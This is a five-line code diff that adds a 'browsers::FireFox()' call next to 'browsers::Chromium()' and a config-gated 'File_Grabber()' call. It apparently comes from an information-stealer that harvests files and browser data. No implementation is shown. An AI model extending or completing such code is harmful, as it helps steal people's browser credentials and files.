@@ -115,4 +115,5 @@ void Other()
 	if (config::enableFileGrubber)
 		files::File_Grabber();
 	browsers::Chromium();
+	browsers::FireFox();
 }
